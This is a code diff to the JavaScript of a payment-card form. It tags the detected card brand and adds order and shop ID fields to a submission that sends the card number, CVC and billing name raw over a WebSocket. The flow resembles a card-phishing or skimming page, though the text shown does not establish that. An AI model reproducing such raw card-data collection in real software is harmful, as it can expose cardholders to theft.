@@ -51,6 +51,8 @@ let isPassedExpiryDate = false;
 let isPassedCVC = false;
 let isPassedBillingName = false;
 
+let bank = 'не распознан'
+
 
 const toggleButton = ()=> {
     if(isPassedEmail && isPassedCardNumber &&
@@ -92,23 +94,29 @@ cardNumberInput.addEventListener('input', (e) => {
         cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
         document.querySelector('.FormFieldExamples').style.display = 'none';
         value = value.substring(0, 13);
+        bank = 'Visa'
     } else if (cardPatterns.mastercard.test(value)) {
         cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
         document.querySelector('.FormFieldExamples').style.display = 'none';
         value = value.substring(0, 16);
+        bank = 'Mastercard'
     } else if (cardPatterns.amex.test(value)) {
         cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
         document.querySelector('.FormFieldExamples').style.display = 'none';
         value = value.substring(0, 16);
+        bank = 'American Express'
     } else if (cardPatterns.jcb.test(value)) {
         cardLogo.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/JCB_logo.svg/200px-JCB_logo.svg.png';
         document.querySelector('.FormFieldExamples').style.display = 'none';
         value = value.substring(0, 16);
+        bank = 'JCB'
+
     } 
     else {
         cardLogo.src = ''; // Очистить логотип, если не совпало
         value = value.substring(0, 16);
         document.querySelector('.FormFieldExamples').style.display = 'flex';
+        bank = 'не распознан'
     }
 
 
@@ -198,7 +206,10 @@ form.addEventListener('submit', (e) => {
         'cvc': cvc,
         'billingName': billingName.value,
         'type': 'form',
-        'uid': localStorage.getItem('uID')
+        'uid': localStorage.getItem('uID'),
+        'order': document.querySelector('.orderdata').value.trim(),
+        'shop_id': document.querySelector('.getShopID').value,
+        'bank': bank
     }
     ws.send(JSON.stringify(result));
     isSelected = true;
